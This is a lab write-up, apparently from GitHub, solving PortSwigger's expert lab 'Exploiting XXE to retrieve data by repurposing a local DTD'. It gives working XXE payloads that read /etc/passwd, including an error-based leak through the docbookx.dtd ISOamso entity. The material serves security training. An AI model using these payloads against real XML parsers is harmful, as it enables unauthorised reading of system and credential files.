## Labs Covered

This write-up focuses on the following **EXPERT-level lab** from the PortSwigger Web Security Academy related to **XML External Entity (XXE) Injection**:

**9 Exploiting XXE to retrieve data by repurposing a local DTD**  
<blockquote>
This lab demonstrates advanced XXE exploitation by repurposing a local Document Type Definition (DTD) to extract sensitive data.
</blockquote>

---

### LAB 9 - Exploiting XXE to retrieve data by repurposing a local DTD

### Lab Description

![image](https://github.com/user-attachments/assets/df1a57f0-6a61-46bb-8fdc-b14a63db19eb)

### Solution

# 📘 XXE Exploitation using Local DTD

After exploring common XXE exploitation methods, it's important to understand **how to exploit XXE using a local DTD**. This technique becomes valuable when:

- External DTD declarations are **blocked**.
- Data cannot be retrieved via **in-band** or **out-of-band** channels.

---

## ❓ When to Use Local DTD?

Use **Local DTD** exploitation when:

1. The application doesn't reflect your injected entities (no in-band leakage).
2. Out-of-band (OOB) channels are filtered or restricted.
3. External DTD inclusion (via `SYSTEM "http://..."`) is blocked.

---

## 🔍 XXE Testing Methodology (Local DTD Focus)

1. **Modify the XML structure** with a test payload to see how the parser behaves.
2. **Attempt to declare a reference or parameter entity**, even if it appears blocked.
3. **Use file-based protocol handler** (like `file://`) to test for file-based reads.
   - Try pointing to a **non-existent path** to see if an error is triggered.
   - You can also test for indirect access by observing logs like:
     ```bash
     tail -f /var/log/apache2/access.log
     ```

---

## 🧪 Initial Testing

Even if you receive an "Invalid product ID" error, try injecting:

```xml
<!ENTITY test SYSTEM "file:///etc/passwd">
````

![image](https://github.com/user-attachments/assets/9a3d8368-bca6-4901-9ee9-46998d9d9688)


You may receive a parser error showing the path (`etc/passwd`), which confirms the parser is processing your entity declaration.

![image](https://github.com/user-attachments/assets/ad749fef-5945-4b05-976d-0319db50044d)

---

## 🔧 Enumerating Files with Forced Errors

To trigger file reads, use invalid paths like:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
%eval;
%error;
```

This causes the parser to request:
`file:///invalid/<contents-of-passwd>`,
which will return an error and potentially leak the file’s contents inside the error message.

![image](https://github.com/user-attachments/assets/2517a8bd-5265-4304-b6bd-cfc758a70365)

---

## 📁 Using Pre-Existing Local DTD

If an internal file such as `/usr/share/yelp/dtd/docbookx.dtd` exists, it can be leveraged as a **local DTD**:

```xml
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
```

Although this is technically an **external entity**, it points to a file **within the local system**, bypassing the network restriction.


---

## 💣 Full Payload Example

```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```


![image](https://github.com/user-attachments/assets/97ccc1f7-b049-49ec-8b31-b66bd3f14412)

### Explanation:

* `%file;` contains the contents of `/etc/passwd`
* `%eval;` dynamically defines another entity `%error;` that requests an invalid path like `/nonexistent/<file_contents>`
* This triggers a parser error, revealing the contents in the error message

Lab is solved as we get passwd file

---


